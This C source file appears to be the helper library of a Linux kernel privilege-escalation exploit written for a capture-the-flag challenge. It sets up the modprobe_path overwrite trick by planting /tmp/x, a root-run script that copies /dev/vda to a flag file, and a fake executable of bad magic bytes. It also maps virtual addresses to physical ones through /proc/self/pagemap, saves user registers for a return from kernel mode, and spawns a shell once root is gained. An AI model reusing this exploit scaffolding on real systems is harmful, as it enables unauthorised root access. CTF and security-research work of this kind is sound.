#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <stdint.h>


#include "util.h"
#include "kernel.h"

int DEV_FD;

unsigned long KERNEL_LEAK = 0;
unsigned long KERNEL_BASE = 0;
unsigned long KERNEL_RODATA = 0;
unsigned long KERNEL_DATA = 0;

unsigned long MODPROBE_PATH = 0;

size_t user_cs, user_ss, user_rflags, user_sp;

void hexdump(void *buf, int len) { printf("\n[i] Dumping %d bytes.\n\n", len);
    for (int i = 0; i < len; i += 0x10){
        printf("ADDR[%d, 0x%x]:\t%016lx: 0x", i / 0x08, i, (unsigned long)(buf + i));

        for (int j = 7; j >= 0; j--) {
            printf("%02x", *(unsigned char *)(buf + i + j));
        }

        printf(" - 0x");

        for (int j = 7; j >= 0; j--) {
            printf("%02x", *(unsigned char *)(buf + i + j + 8));
        }

        puts("");
    }
}

void setup() {
	system("echo -ne '#!/bin/sh\ncat /dev/vda > /tmp/flag' > /tmp/x");
	system("chmod a+x /tmp/x");
	system("echo -ne '\xff\xff\xff\xff' > /tmp/executeme");
	system("chmod a+x /tmp/executeme");
	LOG("Modprobe Setup done.");
}


// See https://www.kernel.org/doc/Documentation/vm/pagemap.txt
uint64_t virt2phys(void* p)
{
    uint64_t virt = (uint64_t)p;

    // Assert page alignment
    assert((virt & 0xfff) == 0);

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd == -1)
        die("open");

    uint64_t offset = (virt / 0x1000) * 8;
    lseek(fd, offset, SEEK_SET);

    uint64_t phys;
    if (read(fd, &phys, 8 ) != 8)
        die("read");

    // Assert page present
    assert(phys & (1ULL << 63));

    phys = (phys & ((1ULL << 54) - 1)) * 0x1000;
    return phys;
}


void die(const char* msg){
    perror(msg);
    exit(-1);
}

void shell(){
    if(!getuid()){
        system("/bin/sh");
    }
    else{
        puts("[!] Failed to Escape");
    }
}

uint64_t u64(uint8_t *buf){
    uint64_t res = 0;
    for(int i =0 ; i < 8;i++)
    {
        res = res<<8;
        res+=(uint)buf[7-i];
    }
    return res;
}

void bind_core(int core) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(core, &cpu_set);
  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}


void save_status(){
    __asm__(
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
    );
    LOG("status registers have been saved.");
}


